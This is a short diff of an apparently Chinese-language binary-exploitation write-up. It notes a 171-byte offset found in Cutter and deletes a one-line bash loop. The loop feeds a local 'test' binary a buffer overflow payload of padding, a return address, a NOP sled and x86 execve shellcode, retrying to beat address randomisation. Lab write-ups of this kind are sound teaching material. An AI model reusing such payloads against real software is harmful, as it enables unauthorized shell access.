@@ -273,6 +273,6 @@ good luck. ( ° ʖ °)
 在 CUTTER 中分析了二进制文件。发现数组大小为 171，这是我们的偏移值。
 
 ```c
-for i in {1..10000}; do (./test $(python2 -c 'print "A" * 171 + "\xa0\xe4\xcf\x7f" + "\x90" * 200 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
+
 ```
 
